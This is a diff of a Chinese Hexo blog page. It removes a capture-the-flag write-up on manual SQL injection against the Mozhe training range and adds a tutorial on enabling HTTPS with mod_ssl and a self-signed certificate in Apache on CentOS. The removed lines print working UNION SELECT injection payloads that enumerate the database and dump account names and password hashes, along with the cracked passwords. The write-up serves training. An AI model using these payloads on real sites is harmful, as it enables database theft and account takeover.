@@ -101,31 +101,20 @@
 
 
 
-  <meta name="description" content="Background  安全工程师”墨者”最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。">
-<meta name="keywords" content="CTF,SQL注入,Web安全">
+  <meta name="description" content="HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性 。HTTPS 在HTTP 的基础下加入SSL 层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL。 HTTPS 存在不同于 HTTP 的默认端口及一个加">
+<meta name="keywords" content="Apache,CentOS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="墨者-SQL手工注入漏洞测试(MySQL数据库)">
-<meta property="og:url" content="http://yoursite.com/2019/07/29/墨者-SQL手工注入漏洞测试-MySQL数据库/index.html">
+<meta property="og:title" content="Apache配置ssl证书-实现https访问">
+<meta property="og:url" content="http://yoursite.com/2020/03/31/Apache配置ssl证书-实现https访问/index.html">
 <meta property="og:site_name" content="Galiyy&#39;blog">
-<meta property="og:description" content="Background  安全工程师”墨者”最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。">
+<meta property="og:description" content="HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性 。HTTPS 在HTTP 的基础下加入SSL 层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL。 HTTPS 存在不同于 HTTP 的默认端口及一个加">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/images/20190729/20190729113544.png">
-<meta property="og:image" content="http://yoursite.com/images/20190729/20190729114259.png">
-<meta property="og:image" content="http://yoursite.com/images/20190729/20190729114641.png">
-<meta property="og:image" content="http://yoursite.com/images/20190729/20190729115010.png">
-<meta property="og:image" content="http://yoursite.com/images/20190729/20190729115329.png">
-<meta property="og:image" content="http://yoursite.com/images/20190729/20190729120127.png">
-<meta property="og:image" content="http://yoursite.com/images/20190729/20190729120708.png">
-<meta property="og:image" content="http://yoursite.com/images/20190729/20190729122245.png">
-<meta property="og:image" content="http://yoursite.com/images/20190729/20190729122351.png">
-<meta property="og:image" content="http://yoursite.com/images/20190729/20190729123431.png">
-<meta property="og:image" content="http://yoursite.com/images/20190729/20190729122608.png">
-<meta property="og:image" content="http://yoursite.com/images/20190729/20190729123107.png">
-<meta property="og:updated_time" content="2019-08-08T08:15:38.781Z">
+<meta property="og:image" content="http://yoursite.com/images/20200319/20200331212719.png">
+<meta property="og:updated_time" content="2020-03-31T13:30:15.661Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="墨者-SQL手工注入漏洞测试(MySQL数据库)">
-<meta name="twitter:description" content="Background  安全工程师”墨者”最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。">
-<meta name="twitter:image" content="http://yoursite.com/images/20190729/20190729113544.png">
+<meta name="twitter:title" content="Apache配置ssl证书-实现https访问">
+<meta name="twitter:description" content="HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性 。HTTPS 在HTTP 的基础下加入SSL 层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL。 HTTPS 存在不同于 HTTP 的默认端口及一个加">
+<meta name="twitter:image" content="http://yoursite.com/images/20200319/20200331212719.png">
 
 
 
@@ -133,7 +122,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2019/07/29/墨者-SQL手工注入漏洞测试-MySQL数据库/">
+  <link rel="canonical" href="http://yoursite.com/2020/03/31/Apache配置ssl证书-实现https访问/">
 
 
 
@@ -143,7 +132,7 @@
   };
 </script>
 
-  <title>墨者-SQL手工注入漏洞测试(MySQL数据库) | Galiyy'blog</title>
+  <title>Apache配置ssl证书-实现https访问 | Galiyy'blog</title>
   
 
 
@@ -375,7 +364,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/29/墨者-SQL手工注入漏洞测试-MySQL数据库/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/31/Apache配置ssl证书-实现https访问/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Galiyy">
@@ -392,7 +381,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">墨者-SQL手工注入漏洞测试(MySQL数据库)
+          <h1 class="post-title" itemprop="name headline">Apache配置ssl证书-实现https访问
 
               
             
@@ -418,23 +407,13 @@
                 
               
 
-              <time title="创建时间：2019-07-29 11:27:48" itemprop="dateCreated datePublished" datetime="2019-07-29T11:27:48+08:00">2019-07-29</time>
+              <time title="创建时间：2020-03-31 17:35:38 / 修改时间：21:30:15" itemprop="dateCreated datePublished" datetime="2020-03-31T17:35:38+08:00">2020-03-31</time>
             </span>
           
 
           
             
 
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-08-08 16:15:38" itemprop="dateModified" datetime="2019-08-08T16:15:38+08:00">2019-08-08</time>
-              </span>
             
           
 
@@ -447,7 +426,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/靶场实战/" itemprop="url" rel="index"><span itemprop="name">靶场实战</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Apache/" itemprop="url" rel="index"><span itemprop="name">Apache</span></a></span>
 
                 
                 
@@ -493,47 +472,40 @@
       
 
       
-        <p><strong><em>Background</em></strong></p>
-<blockquote>
-<p>安全工程师”墨者”最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。</p>
+        <blockquote>
+<p>HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性 。HTTPS 在HTTP 的基础下加入SSL 层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL。 HTTPS 存在不同于 HTTP 的默认端口及一个加密/身份验证层（在 HTTP与 TCP 之间）。这个系统提供了身份验证与加密通讯方法。它被广泛用于万维网上安全敏感的通讯，例如交易支付等方面 。</p>
 </blockquote>
 <a id="more"></a>
 
-<p><img src="/images/20190729/20190729113544.png" alt="image"></p>
-<h2 id="检测SQL注入点"><a href="#检测SQL注入点" class="headerlink" title="检测SQL注入点"></a>检测SQL注入点</h2><p>发现一个维护公告链接<br><img src="/images/20190729/20190729114259.png" alt="image"></p>
-<h3 id="基于报错的检测"><a href="#基于报错的检测" class="headerlink" title="基于报错的检测"></a>基于报错的检测</h3><p>先在链接后的id=1加入 ‘，查看页面反应<br><img src="/images/20190729/20190729114641.png" alt="image"><br>发现页面没有任何显示，可能存在SQL注入</p>
-<h3 id="基于布尔值判断"><a href="#基于布尔值判断" class="headerlink" title="基于布尔值判断"></a>基于布尔值判断</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://mozhe.cn/new_list.php?id=1 and 1=1   正常显示</span><br><span class="line">http://mozhe.cn/new_list.php?id=1 and 1=2   不正常显示</span><br></pre></td></tr></table></figure>
+<h1 id="安装Openssl"><a href="#安装Openssl" class="headerlink" title="安装Openssl"></a>安装Openssl</h1><p>生成ssl证书，需要用到openssl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install openssl-devel -y</span><br><span class="line">yum update openssl</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/20190729/20190729115010.png" alt="image"><br><img src="/images/20190729/20190729115329.png" alt="image"></p>
-<p>那么可以判段存在SQL注入</p>
-<h2 id="判断select字段个数"><a href="#判断select字段个数" class="headerlink" title="判断select字段个数"></a>判断select字段个数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://mozhe.cn/new_list.php?id=1 order by 4</span><br><span class="line">http://mozhe.cn/new_list.php?id=1 order by 5</span><br></pre></td></tr></table></figure>
+<h1 id="重新编译apache"><a href="#重新编译apache" class="headerlink" title="重新编译apache"></a>重新编译apache</h1><p>&emsp;&emsp;配置https，需要用到两个模块mod_socache_shmcb.so和mod_ssl.so，但由于我的apache是源码编译而成的，编译时没有生成mod_ssl.so模块，所以需要重新编译；其实mod_ssl.so可以用过动态方式编译安装，但是稍微有点复杂，所以建议备份网站，重新编译。<br>模块路径（../apache/modules/）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入httpd源码目录</span><br><span class="line"> ./configure --prefix=/usr/local/apache --with-apr=/usr/local/apr --with-apr-util=/usr/local/apr-util --with-pcre=/usr/local/pcre --enable-ssl --enable-so</span><br></pre></td></tr></table></figure>
 
-<p>当order by语句中数值大于4，页面不显示，说明select语句中有4个字段</p>
-<h2 id="查询数据库信息"><a href="#查询数据库信息" class="headerlink" title="查询数据库信息"></a>查询数据库信息</h2><p>先判断页面中会显示的字段位置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<h1 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h1><p>打开httpd.conf配置文件<br>分别找到以下三条指令<br>加载模块(删除#)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LoadModule socache_shmcb_module modules/mod_socache_shmcb.so</span><br><span class="line">LoadModule ssl_module modules/mod_ssl.so</span><br><span class="line">Include conf/extra/httpd-ssl.conf     #引入外部的ssl配置文件</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/20190729/20190729120127.png" alt="image"><br>判断出2，3字段的位置会在页面显示，因此可以开始构造sql语句了</p>
-<p>查询数据库名，版本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,database(),version(),4</span><br></pre></td></tr></table></figure>
+<h2 id="修改外部配置文件"><a href="#修改外部配置文件" class="headerlink" title="修改外部配置文件"></a>修改外部配置文件</h2><p>打开apache目录下conf/extra/httpd-ssl.conf文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ServerName www.xxx.com:443   # 域名</span><br><span class="line">ServerAdmin xxx@xxx.com      # 管理员邮箱</span><br><span class="line"></span><br><span class="line">SSLCertificateFile &quot;/usr/local/apache/conf/server.crt&quot;   # 证书文件</span><br><span class="line">SSLCertificateKeyFile &quot;/usr/local/apache/conf/server.key&quot;  #私钥文件</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/20190729/20190729120708.png" alt="image"></p>
-<p>数据库名：mozhe_Discuz_StormGroup<br>版本：   5.7.22-0ubuntu0.16.04.1</p>
-<p>这里也可以用CONCAT_WS函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),4</span><br></pre></td></tr></table></figure>
+<h1 id="ssl证书"><a href="#ssl证书" class="headerlink" title="ssl证书"></a>ssl证书</h1><p>1、创建密钥<br>生成一个RSA私钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out server.key 2048</span><br></pre></td></tr></table></figure>
 
-<h2 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,table_schema,4 from information_schema.tables limit 1,1</span><br></pre></td></tr></table></figure>
+<p>2、生成CSR（证书签名请求）<br>说明：需要依次输入国家，地区，城市，组织，组织单位，Common Name和Email。其中Common Name，可以写自己的名字或者域名，如果要支持https，Common Name应该与域名保持一致，否则会引起浏览器警告。<br>可以将证书发送给证书颁发机构（CA），CA验证过请求者的身份之后，会出具签名证书，需要花钱。另外，如果只是内部或者测试需求，也可以使用OpenSSL实现自签名。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key server.key -out server.csr</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/20190729/20190729122245.png" alt="image"><br>通过修改limit值获得所有数据库名称<br>获得5个数据库名称<br>information_schema、 mozhe_Discuz_StormGroup、 mysql、 performance_schmozhe.cn</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,table_name,4 from information_schema.tables where table_schema=&apos;mozhe_Discuz_StormGroup&apos; limit 0,1</span><br></pre></td></tr></table></figure>
+<p>3、生成自签名证书<br>内部或者测试使用，只要忽略证书提醒就可以了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -days 3650 -in server.csr -signkey server.key -out server.crt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/20190729/20190729122351.png" alt="image"><br>mozhe_Discuz_StormGroup库的表名：StormGroup_member、 notice</p>
-<h2 id="获取数据库列名"><a href="#获取数据库列名" class="headerlink" title="获取数据库列名"></a>获取数据库列名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,column_name,4 from information_schema.columns where table_schema=&apos;mozhe_Discuz_StormGroup&apos; and table_name=&apos;StormGroup_member&apos; limit 0,1</span><br></pre></td></tr></table></figure>
+<h1 id="http重定向https"><a href="#http重定向https" class="headerlink" title="http重定向https"></a>http重定向https</h1><p>配置httpd.conf<br>加载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/20190729/20190729123431.png" alt="image"><br>StormGroup_member表的列名： id、 name、 password、 status</p>
-<h2 id="获取字段内容（账号密码）"><a href="#获取字段内容（账号密码）" class="headerlink" title="获取字段内容（账号密码）"></a>获取字段内容（账号密码）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,name,password,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 0,1</span><br></pre></td></tr></table></figure>
+<p>在文本结尾添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine on </span><br><span class="line">RewriteCond %&#123;SERVER_PORT&#125; !^443$ </span><br><span class="line">RewriteRule ^.*$ https://%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [L,R]</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/20190729/20190729122608.png" alt="image"><br>账号密码（MD5在线破解）<br>mozhe   356f589a7df439f6f744ff19bb8092c0  —-dsan13<br>mozhe   c0b11cc529cd469efe3c3333e2bcc3db  —-346753</p>
-<h2 id="登陆后台获取key"><a href="#登陆后台获取key" class="headerlink" title="登陆后台获取key"></a>登陆后台获取key</h2><p><img src="/images/20190729/20190729123107.png" alt="image"></p>
+<p>配置成功后访问http时会自动跳转到https页面。</p>
+<p><img src="/images/20200319/20200331212719.png" alt="image"></p>
 
       
     </div>
@@ -560,11 +532,9 @@
         
         <div class="post-tags">
           
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
+            <a href="/tags/Apache/" rel="tag"># Apache</a>
           
-            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
-          
-            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+            <a href="/tags/CentOS/" rel="tag"># CentOS</a>
           
         </div>
       
@@ -577,8 +547,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/27/手动挖掘漏洞-SQL盲注（四）/" rel="next" title="手动挖掘漏洞-SQL盲注（四）">
-                <i class="fa fa-chevron-left"></i> 手动挖掘漏洞-SQL盲注（四）
+              <a href="/2020/03/23/奇特的声明/" rel="next" title="奇特的声明">
+                <i class="fa fa-chevron-left"></i> 奇特的声明
               </a>
             
           </div>
@@ -586,10 +556,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/07/30/墨者-SQL手工注入漏洞测试-Access数据库/" rel="prev" title="墨者-SQL手工注入漏洞测试(Access数据库)">
-                墨者-SQL手工注入漏洞测试(Access数据库) <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -806,7 +772,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#检测SQL注入点"><span class="nav-number">1.</span> <span class="nav-text">检测SQL注入点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于报错的检测"><span class="nav-number">1.1.</span> <span class="nav-text">基于报错的检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于布尔值判断"><span class="nav-number">1.2.</span> <span class="nav-text">基于布尔值判断</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判断select字段个数"><span class="nav-number">2.</span> <span class="nav-text">判断select字段个数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查询数据库信息"><span class="nav-number">3.</span> <span class="nav-text">查询数据库信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取数据库名"><span class="nav-number">4.</span> <span class="nav-text">获取数据库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取数据库列名"><span class="nav-number">5.</span> <span class="nav-text">获取数据库列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取字段内容（账号密码）"><span class="nav-number">6.</span> <span class="nav-text">获取字段内容（账号密码）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#登陆后台获取key"><span class="nav-number">7.</span> <span class="nav-text">登陆后台获取key</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#安装Openssl"><span class="nav-number">1.</span> <span class="nav-text">安装Openssl</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#重新编译apache"><span class="nav-number">2.</span> <span class="nav-text">重新编译apache</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#修改配置文件"><span class="nav-number">3.</span> <span class="nav-text">修改配置文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#修改外部配置文件"><span class="nav-number">3.1.</span> <span class="nav-text">修改外部配置文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ssl证书"><span class="nav-number">4.</span> <span class="nav-text">ssl证书</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#http重定向https"><span class="nav-number">5.</span> <span class="nav-text">http重定向https</span></a></li></ol></div>
             
 
           </div>
